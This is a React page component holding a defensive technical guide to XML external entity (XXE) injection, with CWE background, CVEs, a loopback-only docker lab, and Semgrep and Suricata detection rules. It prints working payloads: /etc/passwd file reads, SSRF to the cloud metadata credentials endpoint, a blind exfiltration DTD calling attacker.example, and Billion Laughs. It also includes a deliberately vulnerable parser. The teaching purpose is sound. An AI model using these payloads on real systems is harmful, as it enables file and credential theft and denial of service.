import { Helmet } from '@dr.pogodin/react-helmet';

const guideUrl = 'https://proksiabel.ee/guides/xxe-explained';

const techArticleSchema = {
  '@context': 'https://schema.org',
  '@type': 'TechArticle',
  headline: 'XXE Explained: Attack Examples & Prevention',
  description:
    'XML external entity (XXE) injection (CWE-611) explained: the XML 1.0 features that make it possible, in-band and blind attack classes, real CVEs, a reproducible docker-compose lab, detection rules, and per-language fix patterns.',
  datePublished: '2026-09-11',
  dateModified: '2026-09-11',
  inLanguage: 'en',
  mainEntityOfPage: guideUrl,
  author: {
    '@type': 'Organization',
    name: 'ProksiAbel OÜ',
    url: 'https://proksiabel.ee/',
  },
  publisher: {
    '@type': 'Organization',
    name: 'ProksiAbel OÜ',
    url: 'https://proksiabel.ee/',
  },
};

export default function XxeGuide() {
  return (
    <>
      <Helmet>
        <script type='application/ld+json'>{JSON.stringify(techArticleSchema)}</script>
      </Helmet>

      <div className='min-h-screen bg-slate-900 pt-24 pb-12'>
        <div className='max-w-4xl mx-auto px-4 sm:px-6 lg:px-8'>
          <p className='text-sm uppercase tracking-wide text-sky-400 font-semibold mb-4'>
            Technical Guide
          </p>
          <h1 className='text-3xl md:text-4xl font-bold text-white mb-6'>
            XXE Explained: Attack Examples &amp; Prevention
          </h1>
          <p className='text-slate-400 text-lg leading-relaxed mb-10'>
            XML external entity (XXE) injection makes your XML parser read local files, call
            internal services, or exhaust memory on the attacker&apos;s behalf — by referencing an
            external entity that the parser was configured to resolve. It is CWE-611. This guide
            covers the spec-level anatomy, a reproducible local lab, detection, and per-language
            fixes.
          </p>

          <div className='max-w-none text-slate-300'>
            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>What XXE is</h2>
              <p className='leading-relaxed mb-4'>
                MITRE defines{' '}
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='https://cwe.mitre.org/data/definitions/611.html'
                  rel='noopener noreferrer'
                >
                  CWE-611
                </a>{' '}
                as the product processing &quot;an XML document that can contain XML entities with
                URIs that resolve to documents outside of the intended sphere of control, causing
                the product to embed incorrect documents into its output&quot;. CWE-611 is a base
                weakness, a child of CWE-610 (Externally Controlled Reference to a Resource in
                Another Sphere) and a peer of CWE-441 (Unintended Proxy or Intermediary — the
                confused deputy). Its two close relatives are{' '}
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='https://cwe.mitre.org/data/definitions/776.html'
                  rel='noopener noreferrer'
                >
                  CWE-776
                </a>{' '}
                (recursive entity references in DTDs, i.e. Billion Laughs) and CWE-827 (improper
                control of the document type definition).
              </p>
              <p className='leading-relaxed mb-4'>
                The OWASP Top 10 placement has moved. XXE was its own category — A4:2017 — and in
                the 2021 edition it was folded into{' '}
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='https://owasp.org/Top10/A05_2021-Security_Misconfiguration/'
                  rel='noopener noreferrer'
                >
                  A05:2021 Security Misconfiguration
                </a>
                , whose mapped-CWE list explicitly includes CWE-611 and CWE-776. (The OWASP XXE
                Prevention Cheat Sheet still links to the 2017 page, so older scanner reports and
                blog posts cite A4.) That placement is accurate: XXE is not a markup flaw, it is a
                parser configuration flaw. The same payload that discloses{' '}
                <code className='text-slate-100'>/etc/passwd</code> on one service is inert on
                another, and the only difference is which features the parser was told to enable.
              </p>
              <p className='leading-relaxed'>
                Practical consequence: you cannot fix XXE with input filtering, and you cannot
                detect it by looking at XML payloads alone. The fix lives in parser construction
                code, and the detection signal is often a network connection the application was
                never supposed to make.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                Anatomy: the XML 1.0 features behind XXE
              </h2>
              <p className='leading-relaxed mb-4'>
                XXE exists because XML 1.0 — a W3C Recommendation dated 26 November 2008 — defines
                two features that were designed for document modularity in the SGML era and were
                carried into the parser defaults of every mainstream language.
              </p>
              <p className='leading-relaxed mb-4'>
                <strong className='text-sky-400'>1. External entity declarations.</strong> Section{' '}
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='https://www.w3.org/TR/xml/#sec-external-ent'
                  rel='noopener noreferrer'
                >
                  4.2.2 External Entities
                </a>{' '}
                defines <code className='text-slate-100'>ExternalID</code> as either{' '}
                <code className='text-slate-100'>SYSTEM</code> plus a system literal or{' '}
                <code className='text-slate-100'>PUBLIC</code> plus a public and system literal. The
                system literal is the entity&apos;s <em>system identifier</em>, and the spec states
                it &quot;is meant to be converted to a URI reference (as defined in [IETF RFC
                3986]), as part of the process of dereferencing it to obtain input for the XML
                processor to construct the entity&apos;s replacement text&quot;. In other words: an
                entity declaration is an instruction to fetch a URI. The spec also notes that
                retrieval may be redirected at the parser level (an entity resolver) or below it (an
                HTTP <code className='text-slate-100'>Location:</code> header) — a detail that
                matters for allow-list bypasses.
              </p>
              <p className='leading-relaxed mb-4'>
                <strong className='text-sky-400'>2. Entity resolution is optional.</strong> Section{' '}
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='https://www.w3.org/TR/xml/#include-if-valid'
                  rel='noopener noreferrer'
                >
                  4.4.3 Included If Validating
                </a>{' '}
                is the crux of the vulnerability class. A processor that is validating the document
                <em> must</em> include the replacement text. But: &quot;If the entity is external,
                and the processor is not attempting to validate the XML document, the processor MAY,
                but need not, include the entity&apos;s replacement text. If a non-validating
                processor does not include the replacement text, it MUST inform the application that
                it recognized, but did not read, the entity.&quot;
              </p>
              <p className='leading-relaxed mb-4'>
                Read that as a specification of two legal behaviours. A parser may refuse to fetch
                the URI — that is the safe, spec-permitted path. A parser may also fetch and inline
                it, which is what makes the payload work. When a parser fetches external entities by
                default, the application inherits a server-side request primitive (and a file-read
                primitive) that no developer asked for. Section{' '}
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='https://www.w3.org/TR/xml/#included'
                  rel='noopener noreferrer'
                >
                  4.4.2 Included
                </a>{' '}
                defines the mechanics: the replacement text is retrieved and processed in place of
                the reference itself, as though it were part of the document.
              </p>
              <p className='leading-relaxed mb-4'>
                There is also a hard limit worth knowing, because it kills a common payload. Section{' '}
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='https://www.w3.org/TR/xml/#forbidden'
                  rel='noopener noreferrer'
                >
                  4.4.4 Forbidden
                </a>{' '}
                makes &quot;a reference to an external entity in an attribute value&quot; a fatal
                error. External entities expand in element content, not inside attributes, so
                payloads that place the reference in an attribute value fail as malformed XML rather
                than leaking anything.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Where entity references are processed
              </h3>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Reference location</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Internal entity</th>
                      <th className='py-3 text-slate-100 font-semibold'>External entity</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>In element content</td>
                      <td className='py-3 pr-4'>Included</td>
                      <td className='py-3'>Included if validating (otherwise MAY)</td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>In an attribute value</td>
                      <td className='py-3 pr-4'>Included in literal</td>
                      <td className='py-3'>Forbidden — fatal error</td>
                    </tr>
                    <tr>
                      <td className='py-3 pr-4'>In the DTD (parameter entity)</td>
                      <td className='py-3 pr-4'>Included as PE</td>
                      <td className='py-3'>Included (external DTD subset is fetched)</td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <p className='leading-relaxed'>
                The third row is the blind-XML channel: parameter entities (
                <code className='text-slate-100'>%name;</code>) are processed inside the DTD itself,
                so a document can tell the parser to fetch a remote DTD whose declarations build a
                second-stage payload. Nothing in the response body has to change for that to work —
                which is exactly why out-of-band XXE is so often missed in code review.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Attack classes</h2>
              <p className='leading-relaxed mb-4'>
                Every XXE variant is one of three primitives — read a URI, reflect the result
                somewhere you can see it, or burn resources — combined with a channel for getting
                data out. CWE-611&apos;s consequence table lists the three impacts plainly: read
                application data or files (confidentiality), bypass a protection mechanism by
                forcing outgoing requests the attacker cannot make directly (integrity), and
                resource-consumption denial of service (availability).
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>In-band file disclosure</h3>
              <p className='leading-relaxed mb-4'>
                The classic form, and the one to test first because it needs no external
                infrastructure:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>`}
              </pre>
              <p className='leading-relaxed mb-4'>
                If the application echoes parsed values back (an error message, a rendered field, a
                search result), the file content comes back with them. On Windows the same payload
                reads <code className='text-slate-100'>file:///c:/windows/win.ini</code>. Note the
                scheme is not limited to <code className='text-slate-100'>file:</code> — the URI is
                dereferenced by whatever the parser&apos;s resolver supports, which historically
                included <code className='text-slate-100'>http</code>,{' '}
                <code className='text-slate-100'>ftp</code>,{' '}
                <code className='text-slate-100'>jar:</code> (Java, useful for large-file DoS) and,
                in PHP builds, <code className='text-slate-100'>php://</code> and{' '}
                <code className='text-slate-100'>expect://</code>.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Server-side request forgery and port scanning
              </h3>
              <p className='leading-relaxed mb-4'>
                Point the entity at an internal URL and the parser becomes a request client inside
                your trust boundary:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<foo>&xxe;</foo>`}
              </pre>
              <p className='leading-relaxed mb-4'>
                On cloud instances this reaches the instance metadata service, the same primitive
                covered in the{' '}
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='/guides/ssrf-explained'
                  rel='noopener noreferrer'
                >
                  SSRF guide
                </a>
                . Without a reflected channel it still works as a scanner: a parser that returns
                &quot;connection refused&quot; in 2 ms and &quot;timed out&quot; in 20 s after 20 s
                is a port scanner, and error text differences leak whether an internal host exists.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Blind (out-of-band) XXE</h3>
              <p className='leading-relaxed mb-4'>
                When nothing is reflected, the attacker supplies an external DTD that reads a local
                file and stuffs it into a URL the parser will fetch. The attacker&apos;s own HTTP
                server logs are the read channel. The canonical two-stage payload is an external DTD
                subset plus nested parameter entities:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`<!-- 1. the request body -->
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.example/evil.dtd">
<foo>ok</foo>

<!-- 2. evil.dtd served by the attacker -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?h=%file;'>">
%eval;
%exfil;`}
              </pre>
              <p className='leading-relaxed mb-4'>
                <code className='text-slate-100'>&#x25;</code> is a character reference for{' '}
                <code className='text-slate-100'>%</code>, needed because the inner{' '}
                <code className='text-slate-100'>%exfil;</code> must be declared in the DTD rather
                than written literally. A cheaper variant skips the callback and uses error-based
                extraction: reference a file through a path that cannot exist, such as{' '}
                <code className='text-slate-100'>file:///nonexistent/%file;</code>, so the parser
                error message itself carries the content.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Denial of service: Billion Laughs
              </h3>
              <p className='leading-relaxed mb-4'>
                CWE-776 abuses internal entity expansion: ten entities each referring ten times to
                the previous one multiplies into a billion copies of a short string.
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>`}
              </pre>
              <p className='leading-relaxed mb-4'>
                This one is worth testing rather than assuming. libxml2 2.9 and later ship
                entity-expansion limits, so against a modern lxml build the payload above normally
                fails with a parse error instead of allocating gigabytes; the same payload against a
                parser without limits still eats the process. Treat it as a control to verify, not a
                guaranteed crash.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Where the XML actually enters
              </h3>
              <p className='leading-relaxed mb-4'>
                The reason XXE keeps appearing in mature codebases is that &quot;does this service
                parse XML?&quot; is answered too narrowly. Every item below is an XML parser entry
                point:
              </p>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  SOAP and XML-RPC endpoints, SAML/SSO assertions, WebDAV and CalDAV bodies,
                  RSS/Atom feed readers.
                </li>
                <li>
                  File uploads of XML-based formats: SVG images, OOXML documents (DOCX/XLSX/PPTX are
                  ZIP archives of XML parts), EPUB, and PDFs with XFA forms — the Apache Tika CVE
                  below is exactly this case.
                </li>
                <li>
                  Server-side XSLT/XPath processing (Java{' '}
                  <code className='text-slate-100'>TransformerFactory</code>,{' '}
                  <code className='text-slate-100'>SchemaFactory</code>,{' '}
                  <code className='text-slate-100'>Validator</code>) where the external-entity
                  settings are separate from the document parser&apos;s.
                </li>
                <li>
                  XInclude processing, which fetches <code className='text-slate-100'>href</code>{' '}
                  targets independently of entity resolution —{' '}
                  <code className='text-slate-100'>
                    {'<xi:include href="file:///etc/passwd"/>'}
                  </code>{' '}
                  discloses files on parsers where entity expansion is already off.
                </li>
              </ul>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                Documented incidents, not hypotheticals
              </h2>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>CVE</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Product</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Entry point</th>
                      <th className='py-3 text-slate-100 font-semibold'>Fix</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>CVE-2025-66516</td>
                      <td className='py-3 pr-4'>Apache Tika (tika-core 1.13–3.2.1)</td>
                      <td className='py-3 pr-4'>
                        Crafted XFA file inside a PDF; CVSS 3.1 8.4 (CWE-611)
                      </td>
                      <td className='py-3'>tika-core ≥ 3.2.2</td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>CVE-2025-68493</td>
                      <td className='py-3 pr-4'>Apache Struts (2.0.0–6.1.0)</td>
                      <td className='py-3 pr-4'>
                        Missing XML validation → XXE (S2-069); CVSS 3.1 8.1
                      </td>
                      <td className='py-3'>Struts 6.1.1</td>
                    </tr>
                    <tr>
                      <td className='py-3 pr-4'>CVE-2017-12629</td>
                      <td className='py-3 pr-4'>Apache Solr (&lt; 7.1, Lucene &lt; 7.1)</td>
                      <td className='py-3 pr-4'>
                        XXE in the XML Query Parser (enabled by default for query requests), chained
                        with the Config API to remote code execution
                      </td>
                      <td className='py-3'>Solr 7.1+</td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <p className='leading-relaxed mb-4'>
                Three details are worth carrying into your own threat model. First, Tika&apos;s
                advisory is explicit that the vulnerable code was in{' '}
                <code className='text-slate-100'>tika-core</code> while the reported entry point was
                the PDF module, so teams that upgraded only the parser module stayed vulnerable —
                fixing the reported component is not the same as fixing the parser. Second, the Tika
                case shows the modern shape of XXE: nobody sent XML to an XML endpoint, they
                uploaded a PDF. Third, Solr 2017 is the reason XXE belongs in a severity
                conversation rather than a hardening checklist — file disclosure chained into RCE
                through a second feature.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Reproducible local lab</h2>
              <p className='leading-relaxed mb-4'>
                Everything below runs in containers on your own machine against a deliberately
                insecure parser — no live targets. The lab has two services: an app with a
                vulnerable and a hardened endpoint, and an attacker container that serves the
                external DTD and logs every request it receives (that log is the out-of-band read
                channel).
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Layout</h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`xxe-lab/
├── docker-compose.yml
├── app/
│   ├── Dockerfile
│   └── app.py
├── attacker/
│   ├── exfil.dtd
│   └── probe.xml
└── payloads/
    ├── 1-file-read.xml
    ├── 2-ssrf.xml
    ├── 3-external-dtd.xml
    └── 4-billion-laughs.xml`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>docker-compose.yml</h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`services:
  app:
    build: ./app
    ports:
      - '127.0.0.1:5001:5001'
  attacker:
    image: python:3.12-alpine
    working_dir: /srv
    command: python -m http.server 8000
    volumes:
      - ./attacker:/srv
    ports:
      - '127.0.0.1:8000:8000'`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Both services publish to loopback only. The attacker is a stock static file server;
                its stdout log lines (
                <code className='text-slate-100'>GET /exfil.dtd HTTP/1.1</code>) are the
                exfiltration channel.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                app/Dockerfile and app/app.py
              </h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`FROM python:3.12-slim
RUN pip install --no-cache-dir flask lxml
COPY app.py /app.py
CMD ["python", "/app.py"]`}
              </pre>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`from flask import Flask, request
from lxml import etree

app = Flask(__name__)


def vulnerable_parser():
    # Insecure on purpose: DTDs are loaded, entities are resolved,
    # and the parser may reach the network.
    return etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)


def hardened_parser():
    return etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)


def parse_with(parser):
    try:
        root = etree.fromstring(request.get_data(), parser=parser)
    except etree.XMLSyntaxError as exc:
        return {'error': str(exc)}, 400
    return {'text': ''.join(root.itertext())}


@app.post('/parse')
def parse_vulnerable():
    return parse_with(vulnerable_parser())


@app.post('/parse-safe')
def parse_hardened():
    return parse_with(hardened_parser())


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)`}
              </pre>
              <p className='leading-relaxed mb-4'>
                The two endpoints differ only in parser construction — which is the entire point of
                the exercise. <code className='text-slate-100'>itertext()</code> flattens all text
                nodes, so anything the parser inlined shows up in the JSON response.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Attacker files and payloads</h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`# attacker/probe.xml — a well-formed document so the parser can inline it
<probe>attacker-controlled</probe>

# attacker/exfil.dtd — an external DTD subset that declares a local-file entity
<!ENTITY xxe SYSTEM "file:///etc/hostname">`}
              </pre>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`<!-- payloads/1-file-read.xml -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>

<!-- payloads/2-ssrf.xml -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker:8000/probe.xml"> ]>
<foo>&xxe;</foo>

<!-- payloads/3-external-dtd.xml -->
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker:8000/exfil.dtd">
<foo>&xxe;</foo>`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Run it and verify</h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`cd xxe-lab
docker compose up -d --build

# Baseline: the file really is inside the container, so a leak is a leak.
docker compose exec app head -n 1 /etc/passwd

# 1. In-band file disclosure
curl -s -X POST http://127.0.0.1:5001/parse --data-binary @payloads/1-file-read.xml
# -> {"text":"root:x:0:0:root:/root:/bin/sh\\n..."}

# 2. SSRF: the app fetches the attacker container's document
curl -s -X POST http://127.0.0.1:5001/parse --data-binary @payloads/2-ssrf.xml
# -> {"text":"attacker-controlled"}

# 3. External DTD fetch: entity declared in the remote DTD reads a local file
curl -s -X POST http://127.0.0.1:5001/parse --data-binary @payloads/3-external-dtd.xml
# -> {"text":"<container-hostname>"}

# The out-of-band channel, as the attacker sees it:
docker compose logs attacker | tail -n 5
# -> "GET /probe.xml HTTP/1.1" 200 -
# -> "GET /exfil.dtd HTTP/1.1" 200 -

# 4. Same payloads against the hardened parser: no leak, and 4 confirms the
#    expansion limit rather than a crash.
curl -s -X POST http://127.0.0.1:5001/parse-safe --data-binary @payloads/1-file-read.xml
# -> {"text":""}  (or a 400 XMLSyntaxError — no file content either way)
curl -s -X POST http://127.0.0.1:5001/parse-safe --data-binary @payloads/4-billion-laughs.xml
# -> {"error":"..."} with an entity-expansion error on libxml2 >= 2.9`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Payload 3 is the one people miss in review: the request body contains no{' '}
                <code className='text-slate-100'>&lt;!ENTITY</code> at all, only a remote DTD
                reference, and the file read happens in declarations the server fetched from the
                attacker. Payload 4 doubles as a calibration check on your libxml2 build — if it
                does not error out, your parser has no expansion limit and Billion Laughs is live.
              </p>
              <p className='leading-relaxed'>
                If your stack is Java or .NET rather than Python, keep the same lab and swap{' '}
                <code className='text-slate-100'>app.py</code> for a two-line endpoint using{' '}
                <code className='text-slate-100'>DocumentBuilderFactory</code> or{' '}
                <code className='text-slate-100'>XmlDocument</code> with default settings. The
                payloads are parser-independent because they only use XML 1.0 features.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Detection</h2>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Static analysis (Semgrep)</h3>
              <p className='leading-relaxed mb-4'>
                Semgrep&apos;s registry already ships rules for the Java parsers, referenced by the
                OWASP cheat sheet:
              </p>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  <code className='text-slate-100'>
                    java.lang.security.audit.xxe.documentbuilderfactory-disallow-doctype-decl-missing
                  </code>
                </li>
                <li>
                  <code className='text-slate-100'>
                    java.lang.security.audit.xxe.saxparserfactory-disallow-doctype-decl-missing
                  </code>
                </li>
                <li>
                  <code className='text-slate-100'>
                    java.lang.security.xmlinputfactory-possible-xxe
                  </code>
                </li>
              </ul>
              <p className='leading-relaxed mb-4'>
                For Python there is no equivalent default, so the parser constructor itself is the
                pattern to match. This rule flags the two flags that create the bug:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`rules:
  - id: py-lxml-entity-resolution-enabled
    languages: [python]
    severity: ERROR
    message: >-
      lxml XMLParser enables entity resolution or DTD loading (CWE-611).
      Use etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True).
    patterns:
      - pattern-either:
          - pattern: lxml.etree.XMLParser(..., resolve_entities=True, ...)
          - pattern: etree.XMLParser(..., resolve_entities=True, ...)
          - pattern: lxml.etree.XMLParser(..., load_dtd=True, ...)
          - pattern: etree.XMLParser(..., load_dtd=True, ...)
    metadata:
      cwe: 'CWE-611'
      owasp: 'A05:2021 - Security Misconfiguration'`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Code review: the five questions that find XXE
              </h3>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Stack</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Grep for</th>
                      <th className='py-3 text-slate-100 font-semibold'>Why it matters</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>Java</td>
                      <td className='py-3 pr-4'>
                        <code className='text-slate-100'>DocumentBuilderFactory.newInstance</code>,{' '}
                        <code className='text-slate-100'>SAXParserFactory.newInstance</code>,{' '}
                        <code className='text-slate-100'>XMLInputFactory.newInstance</code>,{' '}
                        <code className='text-slate-100'>TransformerFactory.newInstance</code>,{' '}
                        <code className='text-slate-100'>SchemaFactory.newInstance</code>
                      </td>
                      <td className='py-3'>
                        XXE is on by default; each factory needs its own hardening, including the
                        XSLT/validation ones
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>.NET</td>
                      <td className='py-3 pr-4'>
                        <code className='text-slate-100'>XmlDocument</code>,{' '}
                        <code className='text-slate-100'>XmlTextReader</code>,{' '}
                        <code className='text-slate-100'>XslCompiledTransform</code>,{' '}
                        <code className='text-slate-100'>DtdProcessing.Parse</code>,{' '}
                        <code className='text-slate-100'>XmlResolver</code>
                      </td>
                      <td className='py-3'>
                        Safe from .NET Framework 4.5.2 by default — unless someone assigns a
                        resolver or sets DtdProcessing.Parse
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>Python</td>
                      <td className='py-3 pr-4'>
                        <code className='text-slate-100'>lxml</code>,{' '}
                        <code className='text-slate-100'>resolve_entities</code>,{' '}
                        <code className='text-slate-100'>load_dtd</code>,{' '}
                        <code className='text-slate-100'>xml.etree</code>,{' '}
                        <code className='text-slate-100'>xml.sax</code>,{' '}
                        <code className='text-slate-100'>xml.dom.minidom</code>,{' '}
                        <code className='text-slate-100'>defusedxml</code>
                      </td>
                      <td className='py-3'>
                        lxml defaults changed over time; stdlib parsers resist external entities but
                        not entity expansion
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>PHP</td>
                      <td className='py-3 pr-4'>
                        <code className='text-slate-100'>simplexml_load_string</code>,{' '}
                        <code className='text-slate-100'>DOMDocument</code>,{' '}
                        <code className='text-slate-100'>LIBXML_NOENT</code>,{' '}
                        <code className='text-slate-100'>LIBXML_DTDLOAD</code>,{' '}
                        <code className='text-slate-100'>libxml_disable_entity_loader</code>
                      </td>
                      <td className='py-3'>
                        libxml2 ≥ 2.9 / PHP ≥ 8.0 is safe by default; explicit{' '}
                        <code className='text-slate-100'>LIBXML_NOENT</code> re-enables the bug
                      </td>
                    </tr>
                    <tr>
                      <td className='py-3 pr-4'>Node.js / Go</td>
                      <td className='py-3 pr-4'>
                        <code className='text-slate-100'>libxmljs</code>,{' '}
                        <code className='text-slate-100'>noent</code>,{' '}
                        <code className='text-slate-100'>dtdload</code>,{' '}
                        <code className='text-slate-100'>fast-xml-parser</code>,{' '}
                        <code className='text-slate-100'>xml2js</code>,{' '}
                        <code className='text-slate-100'>encoding/xml</code>
                      </td>
                      <td className='py-3'>
                        Pure-JS and Go stdlib parsers do not fetch external entities — the risk
                        arrives with native libxml2 bindings
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Network signatures (Suricata)
              </h3>
              <p className='leading-relaxed mb-4'>
                Two starting points (SIDs 1,000,000+ are reserved for local rules — tune before
                deploying). The first catches the inbound probe, the second catches the parser
                reaching out for a remote DTD:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`alert http any any -> any any (msg:"XXE probe - DOCTYPE with external entity in request body"; \\
  flow:established,to_server; http.method; content:"POST"; \\
  http.request_body; content:"<!DOCTYPE"; nocase; content:"SYSTEM"; nocase; within:256; \\
  classtype:web-application-attack; sid:1000201; rev:1;)

alert http any any -> any any (msg:"XML parser fetching remote DTD (blind XXE channel)"; \\
  flow:established,to_server; http.uri; content:".dtd"; endswith; \\
  classtype:web-application-attack; sid:1000202; rev:1;)`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Be clear about the limits of network detection here. An entity pointing at{' '}
                <code className='text-slate-100'>file:///etc/passwd</code> produces no packet at all
                — the disclosure is invisible on the wire. Only the outbound legs (SSRF targets,
                remote DTDs, exfiltration callbacks) are observable. That is why the durable
                detection is architectural: any service that parses untrusted XML should have an
                egress allow-list and an alert on unexpected outbound DNS/HTTP from that service.
                In-band probes are also trivially obfuscated (entity indirection, encoding,
                parameter entities, or the XML being inside an uploaded file), so treat the
                signatures as coverage for careless attacks, not as a control.
              </p>
            </section>

            <section className='mb-10'>
